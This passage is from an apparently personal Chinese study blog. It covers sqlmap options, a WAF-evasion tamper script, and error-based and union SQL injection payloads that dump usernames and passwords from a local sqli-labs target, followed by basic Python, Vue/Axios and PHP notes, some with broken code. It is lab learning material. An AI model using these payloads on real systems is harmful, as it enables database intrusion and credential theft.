class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br></pre></td></tr></table></div></figure>

<p><strong>sqlmap注入技术简介</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">--technique=     （默认全部使用）</span><br><span class="line"></span><br><span class="line">B       基于布尔的盲注</span><br><span class="line"></span><br><span class="line">T       基于时间的盲注</span><br><span class="line"></span><br><span class="line">E      基于报错的注入</span><br><span class="line"></span><br><span class="line">U      基于UNION查询注入</span><br><span class="line"></span><br><span class="line">S      基于多语句查询注入</span><br></pre></td></tr></table></div></figure>

<p><strong>获取数据库信息</strong></p>
<p>1.查看数据库</p>
<p>sqlmap -u “http:&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1” –dbs –batch</p>
<p>2.查看数据库里面的表</p>
<p>sqlmap -u “http:&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –tables –batch</p>
<p>3.查看数据库表里面的列</p>
<p>sqlmap -u “http:&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#x2F;?id&#x3D;1” –D security –T users –columns  –batch</p>
<p>4.查看数据库列里面的具体的值</p>
<p>sqlmap -u “http:&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#x2F;?id&#x3D;1” –D security –T users -C password     –dump  –batch</p>

        <h2 id="3-sqlmap-tamper"   >
          <a href="#3-sqlmap-tamper" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sqlmap-tamper" class="headerlink" title="3.sqlmap-tamper"></a>3.<strong>sqlmap-tamper</strong></h2>
      <p>sqlmap-tamper 是 SQLMap 工具的一个组件，用于在 SQL 注入检测过程中修改、调整或扰乱 SQL 语句，以绕过一些简单的过滤机制，提高 SQL 注入的成功率。</p>
<p>Tamper 脚本是用于修改请求参数中的 SQL 语句的一种技术。它通过对 SQL 注入测试中的参数进行混淆、编码或其他变换，来绕过一些常见的防御机制。这有助于使 SQL 注入攻击更加难以被检测到。</p>
<p>例如，tamper脚本可能会对 SQL 语句进行 URL 编码、Unicode 编码、大小写变换等操作，以绕过一些简单的防护措施。</p>
<p>以下是tamper脚本的一个实例：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></div></figure>

<p>使用 <code>sqlmap</code> 时，你可以使用 <code>--tamper</code> 选项来指定 tamper 脚本的路径或名称（Linux默认一般路径在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;），以便在测试过程中应用定制的 tamper 脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/Less-26a/?id=1&quot; -p id --dbms=MySQL --tamper=1 --dbs --batch</span><br></pre></td></tr></table></div></figure>

<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231228212424576.png" alt="image-20231228212424576"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231228212451515.png" alt="image-20231228212451515"></p>
]]></content>
  </entry>
  <entry>
    <title>SQL注入2</title>
    <url>/2023/12/21/text17/</url>
    <content><![CDATA[
        <h1 id="1-postman使用"   >
          <a href="#1-postman使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-postman使用" class="headerlink" title="1.postman使用"></a>1.postman使用</h1>
      <p>1.进入火狐浏览器按shift+f12左下角网络在相应的页面发生请求可以获得网络活动信息可以找到对应的api请求</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193551394.png" alt="image-20231221193551394"></p>
<p>2.点击new选择http将获取到的api链接放到上方地址栏根据实际情况选择GET还是其它请求点击send就能发送api请求</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221192829536.png" alt="image-20231221192829536"></p>
<p>3.在下方id一栏可以输入注入的sql语句后点击send就能执行注入获得数据库信息</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221193745503.png" alt="image-20231221193745503"></p>

        <h1 id="2-SQL注入之MySQL报错"   >
          <a href="#2-SQL注入之MySQL报错" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入之MySQL报错" class="headerlink" title="2.SQL注入之MySQL报错"></a>2.SQL注入之MySQL报错</h1>
      <p>1.报错注入十大方法，依次是：</p>
<p>（1）floor() 　　如：select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
<p>（2）extractvalue()　　如：select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
<p>（3）updatexml()　　如：select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
<p>（4）geometrycollection()　　如：select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</p>
<p>（5）multipoint()　　如：select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</p>
<p>（6）polygon()　　如：select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</p>
<p>（7）multipolygon()　　如：select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</p>
<p>（8）linestring()　　如：select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</p>
<p>（9）multilinestring()　　如：select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</p>
<p>（10）exp()　　如：select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</p>
<p>2.使用方法就是把select user部分语句换成自己想用来获取什么数据信息的语句</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231221201250317.png" alt="image-20231221201250317"></p>

        <h1 id="3-sql注入介绍"   >
          <a href="#3-sql注入介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sql注入介绍" class="headerlink" title="3.sql注入介绍"></a>3.sql注入介绍</h1>
      <p>1.SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
<p>2.SQL注入漏洞的成因：用户提交的参数数据未做充分检查过滤<br><span class="exturl"><a class="exturl__link"   href="http://www.any.com/index.jsp?username=admin&pass=pass" >http://www.any.com/index.jsp?username=admin&amp;pass=pass</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>3.SQL注入的危害：<br>（1）数据泄露：数据库中存放的用户的隐私信息的泄露。</p>
<p>（2）网页篡改：通过操作数据库对特定网页进行篡改。</p>
<p>（3）网站挂马：修改数据库一些字段的值嵌入网马链接，进行挂马攻击</p>
<p>（4）服务器被远程控制：被安装后门。经由数据库服务器提供的操作系统支持让黑客得以修改或控制      操作系统。<br>（5）数据破坏：数据库服务器被攻击，数据库的系统管理员帐户被窜改系统瘫痪。</p>
<p>4.SQL注入分类：</p>
<p>（1）<strong>基于错误的注入（Error-Based SQL Injection）：</strong> 攻击者通过触发应用程序中的错误，从错误消息中获取敏感信息，或者利用错误来执行进一步的攻击。</p>
<p>（2）<strong>联合查询注入（Union-Based SQL Injection）：</strong> 攻击者利用<code>UNION</code>语句将额外的数据行合并到查询结果中，通常用于提取其他表的信息。</p>
<p>（3）<strong>时间盲注入（Time-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入延时函数，从而判断条件是否为真。这种注入方式常用于盲注入攻击，无法直接获取数据，但可以通过延时来确认注入点。</p>
<p>（4）<strong>基于布尔的盲注入（Boolean-Based Blind SQL Injection）：</strong> 攻击者通过向数据库引入布尔条件，判断查询是否返回真或假，从而逐位地获取数据。</p>
<p>（5）<strong>堆叠查询注入（Stacked Queries SQL Injection）：</strong> 攻击者在单个SQL查询中执行多个查询，从而实现复杂的数据库操作。</p>
<p>（6）<strong>报错盲注入（Error-Based Blind SQL Injection）：</strong> 类似于基于错误的注入，但攻击者无法直接看到错误消息，而是通过观察应用程序的行为来判断注入是否成功。</p>
<p>（7）<strong>UNION查询注入：</strong> 攻击者通过构造<code>UNION</code>语句将额外的数据行合并到查询结果中，从而获取其他表的信息。</p>
<p>（8）<strong>注释符(#)绕过：</strong> 攻击者通过在注入点使用<code>#</code>符号来注释掉原有的SQL语句，从而绕过输入验证。</p>
<p>（9）<strong>报错注入：</strong> 攻击者通过构造恶意的输入，使得数据库产生错误，从而获取敏感信息。</p>
<p>（10）<strong>时间盲注入：</strong> 攻击者通过引入时间延迟，判断SQL查询条件是否为真，从而逐步获取数据。</p>
<p>（11）<strong>Second-Order注入：</strong> 攻击者利用应用程序中存储的用户输入，使得后续的操作受到影响。</p>
<p>5.SQL Injection函数</p>
<p>user（)：当前用户名<br>database(）：当前所用数据库<br>current_user()：当前用户名（可用来查看权限)<br>version()：数据库的版本<br>@@datadir：数据库的路径<br>@@version_compile_os：操作系统版本<br>into dumpfile：写文件操作</p>
<p>into outfile :写文件</p>
<p>load_file()∶读文件操作</p>
<p>concat(str1,str2..)∶连接字符串，连接两个或多个数组</p>
<p>group_concat(str1,str2..)∶连接字符串，能将相同的行组合起来</p>
<p>length ( ) &#x3D;&gt;计算字符串长度</p>
<p>hex ( ) &#x3D;&gt;字符转换为16进制</p>
<p>6.SQL注释</p>
<ol>
<li><strong>单行注释：</strong><ul>
<li>单行注释以<code>--</code>开头，后面的内容将被视为注释。</li>
<li>示例：<code>SELECT * FROM users WHERE username = &#39;admin&#39;; -- This is a comment</code></li>
</ul>
</li>
<li><strong>多行注释：</strong><ul>
<li>多行注释使用<code>/*</code>开头，以<code>*/</code>结尾，之间的内容将被视为注释。</li>
<li>示例：</li>
<li>&#x2F;*<br>   This is a multi-line comment<br>   It can span across multiple lines<br>   SELECT * FROM users WHERE username &#x3D; ‘admin’;<br>*&#x2F;</li>
</ul>
</li>
</ol>
<p>7.information _schema库</p>
<p><code>information_schema</code> 是 MySQL 数据库系统（SQL5开始）中的一个系统数据库，它包含了有关数据库服务器的元数据（metadata元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）和其他信息。这个数据库中的表和视图提供了对数据库服务器状态和配置的访问。</p>
<p>（1）<strong>SCHEMATA：</strong></p>
<ul>
<li>包含所有数据库的信息，比如数据库名称、字符集、排序规则等。</li>
</ul>
<p>（2）<strong>TABLES：</strong></p>
<ul>
<li>包含所有表的信息，比如表名、所属数据库、表类型、存储引擎等。</li>
</ul>
<p>（3）<strong>COLUMNS：</strong></p>
<ul>
<li>包含所有表的列信息，如列名、数据类型、是否为主键等。</li>
</ul>
<p>（4）<strong>STATISTICS：</strong></p>
<ul>
<li>包含表索引的统计信息，如索引名、唯一键信息等。</li>
</ul>
<p>（5）<strong>KEY_COLUMN_USAGE：</strong></p>
<ul>
<li>包含使用主键或唯一键的外键信息。</li>
</ul>
<p>（6）<strong>ROUTINES：</strong></p>
<ul>
<li>包含存储过程和函数的信息。</li>
</ul>
<p>（7）<strong>VIEWS：</strong></p>
<ul>
<li>包含数据库中所有视图的信息。</li>
</ul>
<p>（8）<strong>USER_PRIVILEGES、SCHEMA_PRIVILEGES、TABLE_PRIVILEGES：</strong></p>
<ul>
<li>包含用户和角色的权限信息。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>sql注入1</title>
    <url>/2023/12/20/text16/</url>
    <content><![CDATA[
        <h1 id="1-MySQL的一些语法知识"   >
          <a href="#1-MySQL的一些语法知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MySQL的一些语法知识" class="headerlink" title="1.MySQL的一些语法知识"></a>1.MySQL的一些语法知识</h1>
      <p>– 选择所有列的所有行<br>SELECT * FROM users;</p>
<p>– 选择特定列的所有行<br>SELECT username, email FROM users;</p>
<p>– 添加 WHERE 子句，选择满足条件的行<br>SELECT * FROM users WHERE is_active &#x3D; TRUE;</p>
<p>– 添加 ORDER BY 子句，按照某列的升序排序<br>SELECT * FROM users ORDER BY birthdate;</p>
<p>– 添加 ORDER BY 子句，按照某列的降序排序<br>SELECT * FROM users ORDER BY birthdate DESC;</p>
<p>– 添加 LIMIT 子句，限制返回的行数<br>SELECT * FROM users LIMIT 10;</p>
<p> –等于条件</p>
<p>SELECT * FROM users WHERE username &#x3D; ‘test’;</p>
<p>–UNION 操作符：操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
<p>SELECT city FROM customers UNION  SELECT city FROM suppliers  ORDER BY city;</p>
<p>–GROUP_CONCAT：组内值连接成字符串的聚合函数。用于在分组的基础上将某个列的值连接成一个字符串。</p>
<p>SELECT,GROUP_CONCAT(table_name) ,3 FROM information_schema.tables where table_schema&#x3D;database();</p>
<p>SELECT GROUP_CONCAT(id,”<del>“,username,”</del>“,password) FROM users ;</p>
<p>–select 123</p>
<p><code>SELECT 123</code> 是一个简单的查询，它返回一个包含单个值 <code>123</code> 的结果集。<code>1</code> 和 <code>3</code> 是两个固定的常量，它们分别成为查询结果的两个列。它们没有实际的数据库含义，只是作为结果集的一部分而存在。</p>

        <h1 id="2-SQL注入练习"   >
          <a href="#2-SQL注入练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入练习" class="headerlink" title="2.SQL注入练习"></a>2.SQL注入练习</h1>
      <p>1.环境准备数据库和apache服务都要开，安装php5.59版本(版本过高有些内容无法使用)</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202023010.png" alt="image-20231220202023010"></p>
<p>把sqli文件放在网站根目录，打开网站</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202331397.png" alt="image-20231220202331397"></p>
<p>点击[Setup&#x2F;reset Database for labs]安装重置数据库文件，会出现如下页面代表能够进行注入练习</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202421678.png" alt="image-20231220202421678"></p>
<p>安装Hackbar扩展，安装完成后按shift+f12能看到下方有Hackbar</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202855062.png" alt="image-20231220202855062"></p>
<p>2.点击less1就能进入练习</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202932975.png" alt="image-20231220202932975"></p>
<p>load url(加载本页链接可以在链接后面加注入语句)</p>
<p>excute（执行链接）</p>
<p>在 SQL 中，<code>--</code> 是注释符号，表示其后的文本将被视为注释而不被执行。当在 SQL 注入攻击中使用 <code>--</code> 时，目的是注释掉原始 SQL 语句的剩余部分，以防止它破坏注入 payload。</p>
<p>通过？id&#x3D;1’– -注入成功登录如下图</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220203801878.png" alt="image-20231220203801878"></p>
<p>加入更多的数据查询语句获取更多信息：?id&#x3D;-1’union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204545237.png" alt="image-20231220204545237"></p>
<p>?id&#x3D;-1’union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204634420.png" alt="image-20231220204634420"></p>
]]></content>
  </entry>
  <entry>
    <title>Python文件操作</title>
    <url>/2023/12/18/text18/</url>
    <content><![CDATA[
        <h3 id="Python-文件操作详解"   >
          <a href="#Python-文件操作详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-文件操作详解" class="headerlink" title="Python 文件操作详解"></a>Python 文件操作详解</h3>
      <p>Python 提供了多种文件操作的工具，使得文件的读写和处理变得非常方便。以下是文件操作的一些关键概念和示例。</p>

        <h4 id="1-打开文件"   >
          <a href="#1-打开文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-打开文件" class="headerlink" title="1. 打开文件"></a>1. 打开文件</h4>
      <p>使用 <code>open()</code> 函数打开文件。语法如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">file = open(&#x27;filename&#x27;, &#x27;mode&#x27;)</span><br></pre></td></tr></table></div></figure>

<ul>
<li><code>&#39;filename&#39;</code>：要打开的文件名或路径。</li>
<li><code>&#39;mode&#39;</code>：打开文件的模式，如 <code>&#39;r&#39;</code> 表示读取模式，<code>&#39;w&#39;</code> 表示写入模式，<code>&#39;a&#39;</code> 表示追加模式，<code>&#39;b&#39;</code> 表示二进制模式等。</li>
</ul>

        <h4 id="2-读取文件"   >
          <a href="#2-读取文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h4>
      <p>使用不同的方法读取文件内容：</p>
<p># 读取整个文件 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">content = file.read()</span><br><span class="line"></span><br><span class="line">print(content)</span><br></pre></td></tr></table></div></figure>

<p># 逐行读取文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">lines = file.readlines()</span><br><span class="line"></span><br><span class="line">for line in lines: </span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>




        <h4 id="3-写入文件"   >
          <a href="#3-写入文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-写入文件" class="headerlink" title="3. 写入文件"></a>3. 写入文件</h4>
      <p># 写入整个文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;Hello, World!&#x27;)</span><br></pre></td></tr></table></div></figure>

<p># 追加内容到文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;a&#x27;) as file:</span><br><span class="line"></span><br><span class="line">file.write(&#x27;\nAppending more content.&#x27;)</span><br></pre></td></tr></table></div></figure>




        <h4 id="4-文件迭代器"   >
          <a href="#4-文件迭代器" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-文件迭代器" class="headerlink" title="4. 文件迭代器"></a>4. 文件迭代器</h4>
      <p>使用 <code>for</code> 循环逐行读取文件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line"></span><br><span class="line">for line in file:</span><br><span class="line"></span><br><span class="line">print(line)</span><br></pre></td></tr></table></div></figure>




        <h4 id="5-关闭文件"   >
          <a href="#5-关闭文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-关闭文件" class="headerlink" title="5. 关闭文件"></a>5. 关闭文件</h4>
      <p>在使用 <code>open()</code> 打开文件后，使用 <code>close()</code> 方法关闭文件：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line">codefile = <span class="built_in">open</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></div></figure>


        <h4 id="6-使用-with-语句"   >
          <a href="#6-使用-with-语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用-with-语句" class="headerlink" title="6. 使用 with 语句"></a>6. 使用 <code>with</code> 语句</h4>
      <p>使用 <code>with</code> 语句可以自动管理文件的打开和关闭，确保文件正确关闭：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    # 在此处文件自动关闭</span><br></pre></td></tr></table></div></figure>


        <h4 id="7-二进制文件操作"   >
          <a href="#7-二进制文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-二进制文件操作" class="headerlink" title="7. 二进制文件操作"></a>7. 二进制文件操作</h4>
      <p>读写二进制文件的示例：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codewith open(&#x27;binary_file.bin&#x27;, &#x27;wb&#x27;) as file:</span><br><span class="line">    file.write(b&#x27;Binary data&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;binary_file.bin&#x27;, &#x27;rb&#x27;) as file:</span><br><span class="line">    data = file.read()</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></div></figure>


        <h4 id="8-文件异常处理"   >
          <a href="#8-文件异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-文件异常处理" class="headerlink" title="8. 文件异常处理"></a>8. 文件异常处理</h4>
      <p>在文件操作中添加异常处理，防止程序崩溃：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">pythonCopy codetry:</span><br><span class="line">    with open(&#x27;example.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">        content = file.read()</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&#x27;File not found!&#x27;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&#x27;An error occurred: &#123;e</span><br></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  <entry>
    <title>axios引用,html导入vue2,vue2数据绑定</title>
    <url>/2023/12/18/text14/</url>
    <content><![CDATA[
        <h1 id="Axios-引用"   >
          <a href="#Axios-引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Axios-引用" class="headerlink" title="Axios 引用"></a>Axios 引用</h1>
      <p>Axios 是一个基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js。你可以使用 Axios 来发送异步请求，例如从服务器获取数据。</p>
<p>在 HTML 文件中引入 Axios：</p>
<!-- 导入 Axios -->

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>

<p>可以下载axios文件本地路径引用</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205753451.png" alt="image-20231223205753451"></p>
<p>然后，你可以在 JavaScript 中使用 Axios 发送请求。以下是一个简单的例子：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205847845.png" alt="image-20231223205847845"></p>

        <h1 id="HTML-导入-Vue-2"   >
          <a href="#HTML-导入-Vue-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTML-导入-Vue-2" class="headerlink" title="HTML 导入 Vue 2"></a>HTML 导入 Vue 2</h1>
      <p>Vue.js 是一套构建用户界面的渐进式框架。下面是如何在 HTML 文件中导入 Vue 2：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!-- 导入 Vue 2 --&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>和axios一样也可以下载到本地进行导用</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210036072.png" alt="image-20231223210036072"></p>

        <h1 id="Vue-2-数据绑定使用教程"   >
          <a href="#Vue-2-数据绑定使用教程" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vue-2-数据绑定使用教程" class="headerlink" title="Vue 2 数据绑定使用教程"></a>Vue 2 数据绑定使用教程</h1>
      <p>Vue 2 提供了强大的数据绑定机制，以下是一个简单的使用实例：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210450633.png" alt="image-20231223210450633"></p>
<ol>
<li><strong>el: ‘#app’：</strong> 这里指定了 Vue 实例的挂载点，也就是 HTML 中的 <code>id=&quot;app&quot;</code> 的元素。Vue 将会控制这个元素内部的内容。</li>
<li><strong>data: function()：</strong> 在 <code>data</code> 中定义了 Vue 实例的数据。<code>visible</code> 控制一个元素或组件的可见性，而 <code>userData</code> 是一个包含用户信息的对象，包括 <code>username</code> 和 <code>password</code>。</li>
<li><strong>methods：</strong> 这里定义了一些方法，其中包括：<ul>
<li><strong>login：</strong> 处理用户登录的方法。使用 Axios 发送 POST 请求到 <code>http://127.0.0.1/api1.php</code>，将 <code>this.userData</code>（包含用户输入的用户名和密码）作为请求体发送。然后，根据响应判断是否登录成功，如果成功，重定向到 <code>http://127.0.0.1/index.php</code>，否则调用 <code>open4</code> 方法弹出错误通知。</li>
<li><strong>open4：</strong> 使用 Element UI 的 <code>$notify</code> 方法弹出一个错误通知，显示错误的标题和消息。</li>
</ul>
</li>
</ol>
<p>整个 Vue 实例的作用是监听用户的输入，通过 Axios 发送登录请求，并根据返回结果执行相应的操作。这是一个简单的用户登录页面的前端逻辑。注意，这里的实例中使用了 Element UI 的通知组件，确保你已经导入 Element UI 的相关库和样式。</p>
]]></content>
  </entry>
  <entry>
    <title>PHP</title>
    <url>/2023/12/12/text15/</url>
    <content><![CDATA[
        <h1 id="1-PHP简介"   >
          <a href="#1-PHP简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP简介" class="headerlink" title="1.PHP简介"></a>1.PHP简介</h1>
      <p>  PHP （全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言,是服务器端脚本语言。PHP 脚本在服务器上执行。</p>
<ul>
<li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p>
</li>
<li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p>
</li>
<li><p>PHP 文件的默认文件扩展名是 <strong>.php</strong>。</p>
</li>
<li><p>PHP 可以生成动态页面内容</p>
</li>
<li><p>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</p>
</li>
<li><p>PHP 可以收集表单数据</p>
</li>
<li><p>PHP 可以发送和接收 cookies</p>
</li>
<li><p>PHP 可以添加、删除、修改您的数据库中的数据</p>
</li>
<li><p>PHP 可以限制用户访问您的网站上的一些页面</p>
</li>
<li><p>PHP 可以加密数据</p>
</li>
</ul>

        <h2 id="基本的-PHP-语法"   >
          <a href="#基本的-PHP-语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2>
      <p>PHP 脚本可以放在文档中的任何位置。</p>
<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>在 PHP 中，只有一个字符串运算符并置运算符 (.) 用于把两个字符串值连接起来。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091106682.png" alt="image-20231217091106682"></p>

        <h2 id="PHP-赋值运算符"   >
          <a href="#PHP-赋值运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-赋值运算符" class="headerlink" title="PHP 赋值运算符"></a>PHP 赋值运算符</h2>
      <p>x &#x3D; y左操作数被设置为右侧表达式的值</p>

        <h1 id="2-用PHP实现数据交互"   >
          <a href="#2-用PHP实现数据交互" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用PHP实现数据交互" class="headerlink" title="2.用PHP实现数据交互"></a>2.用PHP实现数据交互</h1>
      <p>1.打开php study 开启MySQL和apache服务</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091152861.png" alt="image-20231217091152861"></p>
<p>2.打开网站根目录新建index.php和link.php 文件</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203313873.png" alt="image-20231212203313873"></p>
<p>3.index.php代码</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203456760.png" alt="image-20231212203456760"></p>
<p>4.link.php代码</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203528339.png" alt="image-20231212203528339"></p>
<p>5.新建MySQL连接并新建查询</p>
<p>打开Navicat Premium <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203801570.png" alt="image-20231212203801570"></p>
<p>新建数据库</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204749503.png" alt="image-20231212204749503"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204910199.png" alt="image-20231212204910199"></p>
<p>新建查询</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205001763.png" alt="image-20231212205001763"></p>
